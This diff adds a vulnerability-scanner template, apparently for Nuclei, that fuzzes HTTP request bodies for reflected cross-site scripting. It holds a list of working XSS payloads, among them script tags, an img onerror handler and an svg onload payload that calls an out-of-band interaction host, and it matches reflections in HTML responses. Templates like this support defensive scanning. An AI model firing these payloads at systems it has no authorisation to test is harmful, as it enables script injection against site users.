@@ -1,0 +1,44 @@
+id: xss-body
+
+info:
+  name: Reflected Cross Site Scripting
+  author: reewardius
+  severity: high
+  tags: fuzzing-req,fuzzing-req-xss,fuzzing-req-body,fuzzing-req-body-query,xss,dast
+  
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+        
+    payloads:
+      reflection:
+        - "'\"><{{first}}"
+        - "<script>alert.?()</script>"
+        - "\"/>'/><svg/onload=(new(Image)).src='//{{interactsh-url}}/'>"
+        - "\"/>'/><script>"
+        - "<a/href/='https://google.com/#><img src=x onerror=alert()>slon</img></h1>'>google</a>"
+        
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+          
+      - type: word
+        part: header
+        words:
+          - "text/html"
